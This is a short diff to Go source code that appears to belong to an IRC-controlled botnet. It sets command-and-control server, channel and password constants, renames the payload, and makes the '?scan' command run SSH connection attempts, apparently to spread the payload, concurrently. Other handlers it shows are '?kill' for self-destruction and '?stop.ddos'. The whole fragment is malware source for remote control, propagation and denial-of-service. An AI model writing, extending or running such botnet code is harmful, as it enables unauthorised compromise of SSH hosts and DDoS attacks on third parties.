@@ -20,7 +20,7 @@ const (
 	IRC_Server        = "192.168.1.4:6667" //config IRC server and port here.
 	IRC_Channel       = "#Test "           //config channel here //should have space!!!
 	IRC_Chan_Password = "3#D}X]kuxT$ "     //config channel password here.
-	Payload_Name      = "contrib"          //config payload name //default is "contrib"
+	Payload_Name      = "payload"          //config payload name //default is "payload"
 )
 
 //////////////////////////////////////////////////////////////////////////
@@ -56,7 +56,6 @@ func main() {
 
 	for {
 		ircRead, err := tp.ReadLine()
-		fmt.Println(ircRead)
 
 		//Server signal interact
 		go func() {
@@ -99,7 +98,7 @@ func main() {
 			} else if tools.IRC_Find(ircRead, "?scan") {
 				tools.Scan_Switch = false
 				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START SCANNING.")
-				tools.SSH_Conn(irc, tools.IRC_Recv(ircRead, 4), IRC_Channel, Payload_Name)
+				go tools.SSH_Conn(irc, tools.IRC_Recv(ircRead, 4), IRC_Channel, Payload_Name)
 			} else if tools.IRC_Find(ircRead, "?kill") {
 				selfDestruct()
 			} else if tools.IRC_Find(ircRead, "?stop.ddos") {
